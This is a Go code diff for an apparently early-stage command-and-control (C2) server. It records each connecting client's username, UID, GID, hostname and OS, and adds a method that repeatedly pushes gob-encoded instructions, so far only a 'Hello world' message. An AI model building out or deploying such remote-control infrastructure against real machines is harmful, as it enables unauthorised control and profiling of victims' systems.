@@ -5,13 +5,17 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"time"
 
 	"github.com/spf13/viper"
 )
 
 type Client struct {
-	OS_username     string
+	Username        string
+	UID             string
+	GID             string
 	OperatingSystem string
+	Hostname        string
 	Conn            net.Conn
 }
 
@@ -23,6 +27,15 @@ var (
 	C2Port     string = "1302"
 	clientList []*Client
 )
+
+func (c Client) Instruct(i Instructions) error {
+	enc := gob.NewEncoder(c.Conn)
+	err := enc.Encode(i)
+	if err != nil {
+		return err
+	}
+	return nil
+}
 
 func Server() {
 	p := viper.GetString("Server.Port")
@@ -53,7 +66,19 @@ func handleConn(conn net.Conn) {
 		log.Printf("Error happened receiving OS information: %v\n", err)
 	}
 	client.Conn = conn
-	fmt.Println("Got info from new user:", client.OS_username, client.OperatingSystem)
+	fmt.Printf("Got info from new user:\nUsername: %v\nUID: %v\nGID: %v\nHostname: %v\nOS: %v\n", client.Username,
+		client.UID, client.GID, client.Hostname, client.OperatingSystem)
+	time.Sleep(time.Second * 7)
+	fmt.Println("7 seconds have passed, sending message!")
+	time.Sleep(time.Millisecond * 500)
+	newMessage := Instructions{
+		Message: "Hello world",
+	}
+	for {
+		time.Sleep(time.Second)
+		client.Instruct(newMessage)
+	}
+
 	// for i, v := range clientList {
 	// 	fmt.Println(i, v)
 	//
